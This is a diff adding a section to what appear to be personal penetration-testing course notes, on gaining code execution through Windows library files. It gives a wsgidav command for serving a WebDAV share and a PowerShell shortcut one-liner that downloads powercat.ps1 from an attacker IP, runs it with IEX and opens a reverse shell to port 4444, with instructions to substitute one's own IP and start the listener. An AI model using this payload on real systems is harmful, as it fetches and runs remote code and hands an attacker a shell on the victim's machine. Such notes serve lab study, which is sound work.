@@ -48,3 +48,26 @@ for i in range(0, len(str), n):
 
  
 ^99cc34
+
+## CODE EXECUTION VIA WINDOWS LIBRARY FILES
+
+we use **wsgidav and webdav** for this to connect a directory with the windows client
+
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+
+To open a port to talk to the client
+
+**Powershell command to download Powercat shell execution**
+Create a shortcut
+```
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
+powercat -c **192.168.119.3** -p 4444 -e powershell"
+```
+
+**IP YOU WISH TO CHANGE IT TO SO IT TALKS TO YOU**
+
+MAKE SURE YOU OPEN BOTH THE HTTP SERVER PORT AND THE NC LISTENER
+
+
+## Q3 (Last Capstone)
+
